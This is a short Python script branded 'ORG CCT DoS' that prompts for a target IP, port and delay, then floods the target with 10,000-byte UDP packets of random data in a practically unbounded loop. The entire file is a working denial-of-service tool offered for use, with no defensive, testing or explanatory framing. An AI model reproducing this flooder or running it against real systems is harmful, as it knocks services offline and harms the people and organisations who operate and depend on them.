import os
import time
import socket
import socket, random, time

print ('\033[92m'"")
os.system("figlet ORG CCT DoS")
print ("")
print ("")
print("DEVELOPER NIX")
print("script v1.0")


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = input("Enter Target IP: ")
port = int(input("Enter Target Port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 10**1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
